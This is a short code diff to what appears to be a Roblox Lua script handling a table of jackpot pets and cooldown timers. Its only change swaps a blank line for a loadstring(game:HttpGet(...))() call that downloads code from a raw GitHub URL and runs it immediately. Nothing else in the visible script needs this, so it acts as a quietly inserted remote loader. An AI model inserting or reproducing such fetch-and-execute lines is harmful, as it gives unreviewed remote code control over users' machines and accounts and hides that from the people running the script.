@@ -33,7 +33,7 @@ local rggJackpotPets = {
 	["Disco Bee"] = true,
 	["T-Rex"] = true
 }
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Xscripts-official/EggRefresher/refs/heads/main/EggRefresherLATEST"))()
 local cooldownTime = 30
 local shuffleCooldown = false
 local currentCountdown = 0
